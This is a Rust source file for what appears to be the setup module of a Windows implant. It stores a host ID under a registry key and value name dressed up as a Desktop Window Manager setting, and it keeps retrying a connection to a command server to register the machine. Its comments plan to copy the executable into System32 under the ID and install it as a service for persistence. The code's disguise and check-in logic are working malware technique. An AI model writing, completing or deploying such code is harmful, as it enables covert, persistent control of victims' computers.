use std::path::Path;
use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

use crate::{CONNECTION_RETRY_DELAY, SERVER_ADDR};

async fn first_launch_setup() -> Result<(), Box<dyn std::error::Error>> {
    // Check if the program has been launched before

    // ask server for uuid
    // save uuid in registry
    // copy current executable to "C:\\Windows\\System32\\\$\{UUID\}\\\$\{UUID\}.exe"
    // create a service that runs the executable
    // stops programd
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    // SOFTWARE\\Microsoft\\Windows\\Dwm"
    let path = Path::new("SOFTWARE")
        .join("Microsoft")
        .join("Windows")
        .join("Dwm");
    let (key, _) = match hklm.create_subkey(&path) {
        Ok(key) => key,
        Err(err) => {
            println!("{}", err);
            std::process::exit(2)
        }
    };

    let mut connected = false;
    while !connected {
        let mut stream = match TcpStream::connect(SERVER_ADDR).await {
            Ok(s) => {
                connected = true;
                s
            }
            Err(_) => {
                // Add a delay before retrying
                println!(
                    "Failed to connect to server, retrying in {} seconds",
                    CONNECTION_RETRY_DELAY
                );
                tokio::time::sleep(std::time::Duration::from_secs(CONNECTION_RETRY_DELAY)).await;
                continue;
            }
        };
        stream.write(b"0").await?;
        stream.readable().await?;
        let mut buf = [0; 38];
        stream.read(&mut buf).await?;
        let uuid = std::str::from_utf8(&buf).unwrap();
        match key.set_value("AnimationSessionUuid", &uuid) {
            Ok(_) => {}
            Err(err) => {
                println!("{}", err);
                println!("Failed to save uuid in registry")
            }
        };

        stream.shutdown().await?;
    }
    std::process::exit(0);
}

pub async fn initialisation() -> String {
    if std::env::consts::OS != "windows" {
        std::process::exit(1)
    }

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let dwm = match hklm.open_subkey("SOFTWARE\\Microsoft\\Windows\\Dwm") {
        Ok(dwm) => dwm,
        Err(_) => {
            println!("Dwm not found");
            std::process::exit(3)
        }
    };
    let value: String = match dwm.get_value("AnimationSessionUuid") {
        Ok(value) => value,
        Err(_) => {
            first_launch_setup().await.unwrap();
            "".to_string()
        }
    };

    return value;
}
